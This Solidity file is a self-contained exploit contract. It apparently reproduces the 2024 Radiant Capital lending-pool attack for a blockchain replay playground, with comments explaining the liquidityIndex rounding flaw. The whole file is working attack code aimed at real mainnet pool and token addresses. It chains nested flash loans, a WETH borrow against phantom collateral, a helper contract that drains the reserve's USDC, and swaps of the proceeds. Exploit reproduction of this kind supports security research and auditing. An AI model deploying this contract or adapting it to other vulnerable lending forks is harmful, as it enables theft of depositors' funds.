// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-01-RadiantCapital).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (the Aave flash-loan callback `executeOperation` and the Uniswap V3 swap
// callback `uniswapV3SwapCallback` both live on the test itself, so there is no
// standalone attack contract to deploy). This contract is a faithful,
// self-contained copy of that inline attack (testExploit + executeOperation +
// uniswapV3SwapCallback + the HelperExploit siphon contract) so the playground
// can deploy it and record run(). Logic and constants are copied verbatim from
// test/RadiantCapital_exp.sol.
//
// Root cause: Radiant's newly-listed rUSDCn reserve is emptied to ~1 scaled
// share, so each Aave flash-loan premium blows liquidityIndex up by a huge
// amount (1e27 -> ~2.7e38). At that index, rayDiv (round-half-up, used on the
// mint/credit side) and rayMul (truncate, used on the burn/debit side) diverge
// by ~half an index per operation, which is worth real underlying at absurd
// index values. Repeated deposit/withdraw cycles at the inflated index drain
// the reserve's real USDC, and the resulting phantom collateral lets the
// attacker borrow WETH against it.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IWETH is IERC20 {
    function withdraw(uint256 wad) external;
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;

    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;

    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;

    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

interface IUniPairV3 {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract RadiantDrain {
    IAaveFlashloan private constant AaveV3Pool = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IAaveFlashloan private constant RadiantLendingPool = IAaveFlashloan(0xF4B1486DD74D07706052A33d31d7c0AAFD0659E1);
    IERC20 private constant USDC = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    IERC20 private constant rUSDCn = IERC20(0x3a2d44e354f2d88EF6DA7A5A4646fd70182A7F55);
    IWETH private constant WETH = IWETH(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));
    IUniPairV3 private constant WETH_USDC = IUniPairV3(0xC6962004f452bE9203591991D15f6b388e09E8D0);
    uint160 private constant MAX_SQRT_RATIO = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_342;
    uint160 private constant MIN_SQRT_RATIO = 4_295_128_739;

    uint8 private operationId;

    // step 0: kick off the outer Aave flash loan of 3,000,000 USDC.
    function run() external {
        operationId = 1;
        bytes memory params = abi.encode(
            address(RadiantLendingPool), address(rUSDCn), address(WETH), address(WETH_USDC), uint256(1), uint256(0)
        );
        takeFlashLoan(address(AaveV3Pool), 3_000_000 * 1e6, params);
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata
    ) external returns (bool) {
        if ((operationId - 1) != 0) {
            if (operationId == 2) {
                // step 2b: repay each of the 151 inner Radiant flash loans.
                operationId = 3;
                uint256 rUSDCnBalanceBeforeTransfer = rUSDCn.balanceOf(address(this));
                USDC.transfer(address(rUSDCn), rUSDCn.balanceOf(address(this)));
                RadiantLendingPool.withdraw(address(USDC), rUSDCnBalanceBeforeTransfer - 1, address(this));
            }
        } else {
            // step 1: seed the empty rUSDCn reserve, then hammer it with 151
            // flash loans so each 0.09% premium re-inflates liquidityIndex.
            USDC.approve(address(RadiantLendingPool), type(uint256).max);
            RadiantLendingPool.deposit(address(USDC), 2_000_000 * 1e6, address(this), 0);
            operationId = 2;
            uint8 i;
            while (i < 151) {
                takeFlashLoan(address(RadiantLendingPool), 2_000_000 * 1e6, abi.encode(type(uint256).max));
                ++i;
            }
            // End flashloan attack

            // step 3: borrow WETH against the phantom collateral value created
            // by the inflated liquidityIndex.
            uint256 amountToBorrow = 90_690_695_360_221_284_999;
            RadiantLendingPool.borrow(address(WETH), amountToBorrow, 2, 0, address(this));

            // step 4: the bug — rayDiv (mint, round-up) vs rayMul (burn,
            // truncate) diverge by ~half the inflated index per round-trip.
            // HelperExploit repeatedly deposits 1 index worth and withdraws
            // 1.5 index worth, draining the reserve's real USDC.
            uint256 transferAmount = rUSDCn.balanceOf(address(this));
            RadiantHelperExploit helper = new RadiantHelperExploit();
            USDC.approve(address(helper), type(uint256).max);
            helper.siphonFundsFromPool(transferAmount);

            // step 5: swap the siphoned USDC into WETH via the Uniswap V3 pool.
            WETH.approve(address(WETH_USDC), type(uint256).max);
            USDC.approve(address(WETH_USDC), type(uint256).max);
            WETH_USDC.swap(address(this), true, 2e18, MIN_SQRT_RATIO + 1, "");
            WETH_USDC.swap(address(this), false, 3_232_558_736, MAX_SQRT_RATIO - 1, "");
        }
        // Repaying Aave flashloan
        USDC.approve(address(AaveV3Pool), type(uint256).max);
        return true;
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        if (amount0Delta > 0) {
            WETH.transfer(address(WETH_USDC), uint256(amount0Delta));
        } else {
            USDC.transfer(address(WETH_USDC), uint256(amount1Delta));
        }
    }

    receive() external payable {}

    function takeFlashLoan(address where, uint256 amount, bytes memory params) internal {
        address[] memory assets = new address[](1);
        assets[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;
        uint256[] memory interestRateModes = new uint256[](1);
        interestRateModes[0] = 0;
        IAaveFlashloan(where).flashLoan(address(this), assets, amounts, interestRateModes, address(this), params, 0);
    }
}

// step 4 helper: repeatedly deposit 1 index worth and withdraw 1.5 index worth
// of USDC against the inflated liquidityIndex, draining the reserve.
contract RadiantHelperExploit {
    IAaveFlashloan private constant RadiantLendingPool = IAaveFlashloan(0xF4B1486DD74D07706052A33d31d7c0AAFD0659E1);
    IERC20 private constant USDC = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    IERC20 private constant rUSDCn = IERC20(0x3a2d44e354f2d88EF6DA7A5A4646fd70182A7F55);

    function siphonFundsFromPool(
        uint256 amount
    ) external {
        USDC.transferFrom(msg.sender, address(this), amount << 1);
        USDC.approve(address(RadiantLendingPool), type(uint256).max);
        bool depositSingleAmount;
        while (true) {
            if (USDC.balanceOf(address(rUSDCn)) < 1) {
                break;
            }
            if (depositSingleAmount == true) {
                RadiantLendingPool.deposit(address(USDC), amount, address(this), 0);
            } else {
                RadiantLendingPool.deposit(address(USDC), amount << 1, address(this), 0);
                depositSingleAmount = true;
            }
            if (USDC.balanceOf(address(rUSDCn)) > ((amount * 3) >> 1) - 1) {
                RadiantLendingPool.withdraw(address(USDC), ((amount * 3) >> 1) - 1, address(this));
            } else {
                RadiantLendingPool.withdraw(address(USDC), USDC.balanceOf(address(rUSDCn)), address(this));
                USDC.transfer(msg.sender, USDC.balanceOf(address(this)));
            }
        }
    }
}
